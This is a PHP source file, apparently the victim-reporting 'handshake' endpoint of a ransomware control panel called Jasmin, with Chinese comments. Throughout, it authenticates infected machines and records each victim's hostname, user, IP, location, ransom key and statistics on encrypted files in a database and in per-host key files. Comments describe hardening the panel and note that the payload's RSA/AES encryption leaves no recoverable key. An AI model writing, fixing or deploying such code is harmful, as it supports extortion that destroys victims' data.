<?php
/**
 * Handshake — 接收受害者上报数据
 * 修复: PDO预处理防SQL注入, 文件名过滤防路径遍历, 密钥从.env读取
 */
require_once __DIR__ . '/database/db_conection.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['handshake'])) {
    http_response_code(403);
    echo 'You Are Not My Jasmin ! Get Lost.';
    exit;
}

// 从.env读取密钥
$secret = $_ENV['HANDSHAKE_SECRET'] ?? '';
if ($secret === '') {
    // 没配置密钥时不能回退到硬编码默认值（那等于公开的通行证）
    http_response_code(503);
    echo 'Handshake secret not configured.';
    exit;
}
if (!is_string($_POST['handshake']) || !hash_equals($secret, $_POST['handshake'])) {
    http_response_code(403);
    echo 'Invalid handshake.';
    exit;
}

// 过滤函数: 仅允许字母数字下划线连字符
function sanitize_filename(string $name): string {
    return preg_replace('/[^a-zA-Z0-9_\-]/', '_', $name);
}

// 统一走 post_str / post_int：直接取 $_POST 会让 `os[]=x` 这样的数组参数
// 流进 sanitize_filename(string) 或 PDO，抛 TypeError → 500。
// 同时按 DB 列宽截断 —— 字段本身没有任何长度约束，而受害者机器（或任何
// 拿到载荷里那个公开握手密钥的人）可以 POST 任意大小，直到 varchar 溢出，
// 或靠 systemid 无限建 passwords/ 子目录耗尽 inode。
$cap = function(string $v, int $n): string { return substr($v, 0, $n); };
$machine_name   = $cap(post_str('machine_name'),   200);   // varchar(255)
$computer_user  = $cap(post_str('computer_user'),  200);
$os             = $cap(post_str('os'),              90);   // varchar(100)
$date           = $cap(post_str('date'),            90);
$time           = $cap(post_str('time'),            20);   // 用于 strtotime + time 列
$systemid       = $cap(post_str('systemid'),       200);
$location       = $cap(post_str('location'),       200);
// IP 取服务端可见的真实来源：nginx 已设 X-Forwarded-For，
// 上报值可被被控端随意伪造，取证上不可信。
$_xff = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
$_rip = $_SERVER['HTTP_X_REAL_IP'] ?? '';
if ($_rip !== '')                $ip = $_rip;
elseif ($_xff !== '')            $ip = trim(explode(',', $_xff)[0]);
else                             $ip = $_SERVER['REMOTE_ADDR'] ?? '';
$password        = $cap(post_str('password'), 200);
$encrypted_count = post_int('encrypted_count');
$encrypted_size  = post_int('encrypted_size');
$encrypted_types = $cap(post_str('encrypted_types'), 4000);  // text
$encrypted_detail = $cap(post_str('encrypted_detail'), 4000); // text
$total_count     = post_int('total_count');
$total_size      = post_int('total_size');
$is_complete     = post_int('is_complete', 1);  // 缺省视为已完成，兼容旧载荷
$is_complete     = $is_complete ? 1 : 0;

// 安全文件名
$safe_machine  = sanitize_filename($machine_name);
$safe_user     = sanitize_filename($computer_user);
$safe_systemid = sanitize_filename($systemid);
// strtotime 失败返回 false，date(..., false) = date(..., 0) = 1970，
// 于是所有时间戳异常的上报都会算出同一个文件名、互相覆盖。
$ts = strtotime($time);
$newtime = ($ts === false) ? date("H-i-s") : date("H-i-s", $ts);

$folder = sanitize_filename($safe_machine . '_' . $safe_user);
$file   = sanitize_filename($newtime . '_' . $safe_systemid) . '.flora';

// ── 每主机 .flora ──
// 混合加密（每文件随机 AES key + RSA-OAEP）之后，后台【不再持有】任何
// 可用于解密受害主机的东西，载荷也就只会回报 'RSA_PROTECTED' 这个占位串。
// 旧代码会照写不误，于是后台"下载受害者密钥"按钮下到的文件里就一行字面量
// 'RSA_PROTECTED' —— 一个指向不存在功能的承诺。
// 现在只有真的上报了密钥材料时才落盘；同时按目录数上限挡住
// 「用随机 systemid 无限建目录耗尽 inode」这条路。
$REAL_KEY = ($password !== '' && $password !== 'RSA_PROTECTED');
if ($REAL_KEY) {
    $base_dir = __DIR__ . '/passwords';
    if (!is_dir($base_dir)) {
        mkdir($base_dir, 0750, true);
    }
    $target_dir = $base_dir . '/' . $folder;
    if (!is_dir($target_dir)) {
        // 单主机目录上限，防止 inode 耗尽
        $n = count(glob($base_dir . '/*', GLOB_ONLYDIR));
        if ($n >= 5000) {
            error_log('[jasmin handshake] passwords/ 目录数已达上限，跳过落盘');
        } else {
            mkdir($target_dir, 0750, true);
        }
    }
    if (is_dir($target_dir)) {
        file_put_contents($target_dir . '/' . $file, $password);
    }
}

// PDO预处理 — upsert: 同一systemid更新统计数据，新主机插入
$stmt = $pdo->prepare(
    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password, encrypted_count, encrypted_size, encrypted_types, encrypted_detail, total_count, total_size, is_complete)
     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types, :encrypted_detail, :total_count, :total_size, :is_complete)
     ON DUPLICATE KEY UPDATE
       machine_name=VALUES(machine_name), computer_user=VALUES(computer_user),
       os=VALUES(os), ip=VALUES(ip), location=VALUES(location),
       encrypted_count=IF(VALUES(encrypted_count)>0,VALUES(encrypted_count),encrypted_count),
       encrypted_size=IF(VALUES(encrypted_size)>0,VALUES(encrypted_size),encrypted_size),
       encrypted_types=IF(VALUES(encrypted_types)!="",VALUES(encrypted_types),encrypted_types),
       encrypted_detail=IF(VALUES(encrypted_detail)!="{}" AND VALUES(encrypted_detail)!="",VALUES(encrypted_detail),encrypted_detail),
       total_count=IF(VALUES(total_count)>0,VALUES(total_count),total_count),
       total_size=IF(VALUES(total_size)>0,VALUES(total_size),total_size),
       is_complete=VALUES(is_complete)'
);
try {
$stmt->execute([
    ':machine_name'    => $machine_name,
    ':computer_user'   => $computer_user,
    ':os'              => $os,
    ':date'            => $date,
    ':time'            => $time,
    ':ip'              => $ip,
    ':location'        => $location,
    ':systemid'        => $systemid,
    ':password'        => $password,
    ':encrypted_count' => $encrypted_count,
    ':encrypted_size'  => $encrypted_size,
    ':encrypted_types' => $encrypted_types,
    ':encrypted_detail'=> $encrypted_detail,
    ':total_count'     => $total_count,
    ':total_size'      => $total_size,
    ':is_complete'     => $is_complete,
]);
} catch (PDOException $e) {
    // 例如 time 列收到无法解析的值。此前未捕获 → 直接把 PHP 错误页吐给上报方。
    error_log('[jasmin handshake] insert failed: ' . $e->getMessage());
    http_response_code(400);
    echo 'handshake rejected';
    exit;
}

echo 'handshake completed';
